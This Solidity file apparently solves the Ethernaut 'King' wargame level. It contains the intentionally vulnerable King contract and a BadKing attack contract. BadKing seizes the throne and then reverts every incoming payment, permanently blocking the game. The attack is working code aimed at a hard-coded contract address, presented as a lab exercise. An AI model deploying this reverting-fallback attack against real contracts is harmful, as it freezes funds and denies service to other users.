pragma solidity ^0.4.23;

contract Ownable {
  address public owner;

  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
}

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}

contract BadKing {
    King public king = King(0xa95913d9b5793abae628676ade368251f6d0d6ed);
    
    // Create a malicious contract and seed it with some Ethers
    function BadKing() public payable {
    }
    
    // This should trigger King fallback(), making this contract the king
    function becomeKing() public {
        address(king).call.value(1000000000000000000).gas(4000000)();
    }
    
    // This function fails "king.transfer" trx from Ethernaut
    function() external payable {
        revert("haha you fail");
    }
}